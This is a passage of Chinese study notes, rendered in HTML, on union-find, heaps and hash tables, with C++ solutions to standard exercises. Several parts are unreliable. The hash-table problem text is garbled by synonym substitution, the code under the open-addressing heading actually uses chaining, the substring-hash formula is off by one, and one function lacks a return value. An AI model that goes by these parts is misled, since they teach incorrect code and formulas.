class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>;<br><span class="hljs-comment">//存放i结点对应的父节点序号</span><br><span class="hljs-type">int</span> father[N];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span>&#123;<br>father[x]=y;<br>&#125;<br><br><span class="hljs-comment">//找到元素x的父节点</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br><span class="hljs-keyword">if</span>(father[x]!=x) <span class="hljs-keyword">return</span> <span class="hljs-built_in">find</span>(father[x]);<br><span class="hljs-keyword">return</span> x;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> n,m;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>father[i]=i;<br>&#125;<br><span class="hljs-keyword">while</span>(m--)&#123;<br><span class="hljs-type">char</span> op[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> x,y;<br>cin&gt;&gt;op&gt;&gt;x&gt;&gt;y;<br><span class="hljs-keyword">if</span>(op[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;M&#x27;</span>)&#123;<br><span class="hljs-built_in">insert</span>(<span class="hljs-built_in">find</span>(x),<span class="hljs-built_in">find</span>(y));<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">find</span>(x)==<span class="hljs-built_in">find</span>(y)) cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-2连通块中点的数量"><a href="#7-2连通块中点的数量" class="headerlink" title="7.2连通块中点的数量"></a>7.2连通块中点的数量</h2><p>给定一个包含 n 个点（编号为 1∼n）的无向图，初始时图中没有边。</p><p>现在要进行 m 个操作，操作共有三种：</p><p>C a b，在点 a 和点 b 之间连一条边（可能存在多条边），a 和 b 可能相等；<br>Q1 a b，询问点 a 和点 b 是否在同一个连通块中，a 和 b 可能相等；<br>Q2 a，询问点 a 所在连通块中点的数量；<br>输入格式<br>第一行输入整数 n 和 m。</p><p>接下来 m 行，每行包含一个操作指令，指令为 C a b，Q1 a b 或 Q2 a 中的一种。</p><p>输出格式<br>对于每个询问指令 Q1 a b，如果 a 和 b 在同一个连通块中，则输出 Yes，否则输出 No。</p><p>对于每个询问指令 Q2 a，输出一个整数表示点 a 所在连通块中点的数量</p><p>每个结果占一行。</p><p>数据范围<br>1≤n,m≤105<br>输入样例：<br>5 5<br>C 1 2<br>Q1 1 2<br>Q2 1<br>C 2 5<br>Q2 5<br>输出样例：<br>Yes<br>2<br>3</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>;<br><span class="hljs-comment">//存放i结点对应的父节点序号</span><br><span class="hljs-comment">//Size[i]存放i所属集合的大小</span><br><span class="hljs-type">int</span> father[N],Size[N];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span>&#123;<br>father[x]=y;<br>&#125;<br><br><span class="hljs-comment">//找到元素x的父节点</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br><span class="hljs-keyword">if</span>(father[x]!=x) <span class="hljs-keyword">return</span> <span class="hljs-built_in">find</span>(father[x]);<br><span class="hljs-keyword">return</span> x;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> n,m;<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>father[i]=i;<br>Size[i]=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(m--)&#123;<br><span class="hljs-type">char</span> op[<span class="hljs-number">3</span>];<br><span class="hljs-type">int</span> x,y;<br>cin&gt;&gt;op;<br><span class="hljs-keyword">if</span>(op[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;C&#x27;</span>)&#123;<br>cin&gt;&gt;x&gt;&gt;y;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">find</span>(x)==<span class="hljs-built_in">find</span>(y)) <span class="hljs-keyword">continue</span>;<br>Size[<span class="hljs-built_in">find</span>(y)]+=Size[<span class="hljs-built_in">find</span>(x)];<br><span class="hljs-built_in">insert</span>(<span class="hljs-built_in">find</span>(x),<span class="hljs-built_in">find</span>(y));<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(op[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>cin&gt;&gt;x&gt;&gt;y;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">find</span>(x)==<span class="hljs-built_in">find</span>(y)) cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>cin&gt;&gt;x;<br>cout&lt;&lt;Size[<span class="hljs-built_in">find</span>(x)]&lt;&lt;endl;<br>&#125;<br><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="8-堆"><a href="#8-堆" class="headerlink" title="8.堆"></a>8.堆</h1><p>堆是完全二叉树</p><p>1.插入一个数 heap[++size]=x;up(size);</p><p>2.求集合中的最小值heap[1]</p><p>3.删除最小值heap[1]=heap[size];size—;down(1);</p><p>4.删除任意一个值heap[k]=heap[size];size—;down(k);up(k);</p><p>5.改变任意一个值heap[k]=x;down(k);up(k);</p><h2 id="8-1堆排序"><a href="#8-1堆排序" class="headerlink" title="8.1堆排序"></a>8.1堆排序</h2><p>输入一个长度为 n 的整数数列，从小到大输出前 m 小的数。</p><p>输入格式<br>第一行包含整数 n 和 m。</p><p>第二行包含 n 个整数，表示整数数列。</p><p>输出格式<br>共一行，包含 m 个整数，表示整数数列中前 m 小的数。</p><p>数据范围<br>1≤m≤n≤105，<br>1≤数列中元素≤109<br>输入样例：<br>5 3<br>4 5 1 3 2<br>输出样例：<br>1 2 3</p><h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//最小堆</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100003</span>;<br><br><span class="hljs-comment">//Size存放堆中元素个数</span><br><span class="hljs-type">int</span> heap[N],Size;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br><span class="hljs-comment">//t表示三个点中的最小值的编号</span><br><span class="hljs-type">int</span> t=x;<br><span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*x&lt;=Size&amp;&amp;heap[<span class="hljs-number">2</span>*x]&lt;heap[t]) t=<span class="hljs-number">2</span>*x;<br><span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>&lt;=Size&amp;&amp;heap[<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>]&lt;heap[t]) t=<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(t!=x)&#123;<br><span class="hljs-built_in">swap</span>(heap[x],heap[t]);<br><span class="hljs-built_in">down</span>(t);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<br><br><span class="hljs-comment">//为保持x 2x 2x+1的规律 从1开始</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;heap[i]);<br>&#125;<br><br>Size=n;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n/<span class="hljs-number">2</span>;i;i--)&#123;<br><span class="hljs-built_in">down</span>(i);<br>&#125;<br><br><span class="hljs-keyword">while</span>(m--)&#123;<br><span class="hljs-comment">//输出堆顶</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,heap[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">//将堆顶删除</span><br>heap[<span class="hljs-number">1</span>]=heap[Size--];<br><span class="hljs-built_in">down</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-2模拟堆"><a href="#8-2模拟堆" class="headerlink" title="8.2模拟堆"></a>8.2模拟堆</h2><p>题目描述<br>维护一个集合，初始时集合为空，支持如下几种操作：</p><p>“I x”，插入一个数x；<br>“PM”，输出当前集合中的最小值；<br>“DM”，删除当前集合中的最小值（当最小值不唯一时，删除最早插入的最小值）；<br>“D k”，删除第k个插入的数；<br>“C k x”，修改第k个插入的数，将其变为x；</p><p>现在要进行N次操作，对于所有第2个操作，输出当前集合的最小值。</p><p>输入格式<br>第一行包含整数N。</p><p>接下来N行，每行包含一个操作指令，操作指令为”I x”，”PM”，”DM”，”D k”或”C k x”中的一种。</p><p>输出格式<br>对于每个输出指令“PM”，输出一个结果，表示当前集合中的最小值。</p><p>每个结果占一行。</p><p>数据范围<br>1≤N≤10^5</p><p>−10^9≤x≤10^9</p><p>数据保证合法。</p><p>输入样例</p><p>8<br>I -10<br>PM<br>I -10<br>D 1<br>C 2 8<br>I 6<br>PM<br>DM</p><p>输出样例</p><p>-10<br>6</p><h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-comment">//#include&lt;algorithm&gt;</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>;<br><br><span class="hljs-comment">//heap是堆 ph是p-&gt;h指针指向的堆 hp是p-&gt;h堆对应的指针(而这里的指针就是插入的次序)</span><br><span class="hljs-type">int</span> heap[N],ph[N],hp[N],Size;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heap_swap</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span>&#123;<br><span class="hljs-built_in">swap</span>(ph[hp[a]],ph[hp[b]]);<br><span class="hljs-built_in">swap</span>(hp[a],hp[b]);<br><span class="hljs-built_in">swap</span>(heap[a],heap[b]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br><span class="hljs-comment">//t表示三个点中的最小值的编号</span><br><span class="hljs-type">int</span> t=x;<br><span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*x&lt;=Size&amp;&amp;heap[<span class="hljs-number">2</span>*x]&lt;heap[t]) t=<span class="hljs-number">2</span>*x;<br><span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>&lt;=Size&amp;&amp;heap[<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>]&lt;heap[t]) t=<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(t!=x)&#123;<br><span class="hljs-built_in">heap_swap</span>(x,t);<br><span class="hljs-built_in">down</span>(t);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">up</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br><span class="hljs-keyword">while</span>(x/<span class="hljs-number">2</span>&amp;&amp;heap[x]&lt;heap[x/<span class="hljs-number">2</span>])&#123;<br><span class="hljs-built_in">heap_swap</span>(x,x/<span class="hljs-number">2</span>);<br>x/=<span class="hljs-number">2</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> n,idx=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><span class="hljs-keyword">while</span>(n--)&#123;<br>string op;<br><span class="hljs-type">int</span> k,x;<br>cin&gt;&gt;op;<br><span class="hljs-comment">//scanf(&quot;%s&quot;,&amp;op);</span><br><span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;I&quot;</span>)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>heap[++Size]=x;<br>ph[++idx]=Size;<br>hp[Size]=idx;<br><span class="hljs-built_in">up</span>(Size);<br><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;PM&quot;</span>)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,heap[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;DM&quot;</span>)&#123;<br><span class="hljs-built_in">heap_swap</span>(<span class="hljs-number">1</span>,Size);<br>Size--;<br><span class="hljs-built_in">down</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;D&quot;</span>)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;k);<br>k=ph[k];<br><span class="hljs-built_in">heap_swap</span>(k,Size);<br><span class="hljs-comment">//heap[k]=heap[Size--]; 因为带ph和hp所以不能直接这样写</span><br>Size--;<br><span class="hljs-built_in">down</span>(k);<br><span class="hljs-built_in">up</span>(k);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;C&quot;</span>)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;k,&amp;x);<br>k=ph[k];<br>heap[k]=x;<br><span class="hljs-built_in">down</span>(k);<br><span class="hljs-built_in">up</span>(k);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="9-哈希表"><a href="#9-哈希表" class="headerlink" title="9.哈希表"></a>9.哈希表</h1><h2 id="9-1模仿散列表"><a href="#9-1模仿散列表" class="headerlink" title="9.1模仿散列表"></a>9.1模仿散列表</h2><p>保护一个调集，支持如下几种操作：</p><ol><li><code>I x</code>，刺进一个数x；</li><li><code>Q x</code>，问询数x是否在调集中呈现过； 现在要进行N次操作，关于每个问询操作输出对应的成果。</li></ol><p>输入格局</p><p>榜首行包括整数N，表明<a href="https://www.6hu.cc/archives/tag/操作数">操作数</a>量。</p><p>接下来N行，每行包括一个操作指令，操作指令为<code>I x</code>，<code>Q x</code>中的一种。</p><p>输出格局</p><p>关于每个问询指令<code>Q x</code>，输出一个问询成果，假如xx在调集中呈现过，则输出<code>Yes</code>，不然输出<code>No</code>。</p><p>每个成果占一行。</p><p>数据规模</p><p>1≤N≤105,1≤N≤105<br>−109≤x≤109−109≤x≤109</p><p>输入样例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">5</span><br><span class="hljs-selector-tag">I</span> <span class="hljs-number">1</span><br><span class="hljs-selector-tag">I</span> <span class="hljs-number">2</span><br><span class="hljs-selector-tag">I</span> <span class="hljs-number">3</span><br><span class="hljs-selector-tag">Q</span> <span class="hljs-number">2</span><br><span class="hljs-selector-tag">Q</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>输出样例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-literal">Yes</span><br><span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><p>拉链法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br></code></pre></td></tr></table></figure><p>开放寻址法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//用拉链法解决冲突</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span> <span class="hljs-comment">//memset()在该库</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100003</span>;<br><br><br><span class="hljs-type">int</span> e[N],ne[N],h[N],idx;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br><span class="hljs-type">int</span> k=(x%N+N)%N;<span class="hljs-comment">//k是hash值</span><br><br><span class="hljs-comment">//在头结点出插入</span><br>e[idx]=x;<br>ne[idx]=h[k];<br>h[k]=idx++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br><span class="hljs-type">int</span> k=(x%N+N)%N;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=h[k];i!=<span class="hljs-number">-1</span>;i=ne[i])&#123;<br><span class="hljs-keyword">if</span>(e[i]==x)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><br><span class="hljs-comment">//将h数组中每个字节置为-1,即实现数组中每个数为-1</span><br><span class="hljs-built_in">memset</span>(h,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> h);<br><br><span class="hljs-keyword">while</span>(n--)&#123;<br><span class="hljs-type">char</span> op[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> x;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s%d&quot;</span>,op,&amp;x);<br><span class="hljs-keyword">if</span>(*op==<span class="hljs-string">&#x27;I&#x27;</span>) <span class="hljs-built_in">insert</span>(x);<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">find</span>(x)) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Yes&quot;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>&#125;<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>1.将字符串看成p进制的数</p><p>2.将其转化成10进制数</p><p>3.再将其取模Q(将任何一个数映射到0~Q-1)</p><p>注意：1.不能映射成0</p><p>2.当P=131或13331,Q=2^64 很大概率不存在冲突</p><p>3.处于前面的字符是高位</p><p>4.用unsigned long long 定义hash[],相当与直接对存储的数取模2^64(因为超过的地方相当于溢出)</p><p>预处理hash[i]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">h[i]=h[i<span class="hljs-number">-1</span>]*p+str[i]<br></code></pre></td></tr></table></figure><p>一直hash[i]求任意子序列hash</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">h[R]-h[L]*P^(R-L+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="9-2字符串哈希"><a href="#9-2字符串哈希" class="headerlink" title="9.2字符串哈希"></a>9.2字符串哈希</h2><p>给定一个长度为nn的字符串，再给定mm个问询，每个问询包括四个整数l1,r1,l2,r2l1,r1,l2,r2，请你判别[l1,r1][l1,r1]和[l2,r2][l2,r2]这两个区间所包括的字符串子串是否完全相同。</p><p>字符串中只包括大小写英文字母和数字。</p><p>输入格局</p><p>榜首行包括整数nn和mm，表明字符串长度和问询次数。</p><p>第二行包括一个长度为nn的字符串，字符串中只包括大小写英文字母和数字。</p><p>接下来mm行，每行包括四个整数l1,r1,l2,r2l1,r1,l2,r2，表明一次问询所触及的两个区间。</p><p>留意，字符串的方位从11开始编号。</p><p>输出格局</p><p>关于每个问询输出一个成果，假如两个字符串子串完全相同则输出<code>Yes</code>，不然输出<code>No</code>。</p><p>每个成果占一行。</p><p>数据规模</p><p>1≤n,m≤1051≤n,m≤105</p><p>输入样例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">aabbaabb</span><br><span class="hljs-attribute">1</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">7</span><br><span class="hljs-attribute">1</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>输出样例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-literal">Yes</span><br><span class="hljs-literal">No</span><br><span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure><p>代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br></code></pre></td></tr></table></figure><p>vector初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span 